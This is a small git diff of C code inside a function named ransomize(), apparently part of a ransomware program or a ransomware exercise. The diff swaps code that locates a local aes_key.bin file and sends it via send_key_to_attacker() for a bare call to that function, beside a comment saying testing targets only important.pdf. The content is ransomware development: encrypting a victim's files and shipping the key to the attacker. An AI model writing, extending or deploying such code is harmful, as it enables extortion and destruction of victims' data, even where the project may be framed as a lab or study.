@@ -27,7 +27,7 @@ int ransomize(void)
         free(paths[i]);
     }
     free(paths);
-
+    
     /*For testing purposes, only get important.pdf*/
     char important[MAX_PATH];
     if (get_relative_path(important, sizeof(important), "important.pdf") != 0) {
@@ -43,10 +43,7 @@ int ransomize(void)
     // In attack_crypto
 
     /* Handle remote actions */
-    char aes_key_path[MAX_PATH];
-    if (get_relative_path(aes_key_path, sizeof(aes_key_path), "aes_key.bin") == 0) {
-        send_key_to_attacker(aes_key_path);
-    }
+    send_key_to_attacker();
 
     /* Cleanup */
 
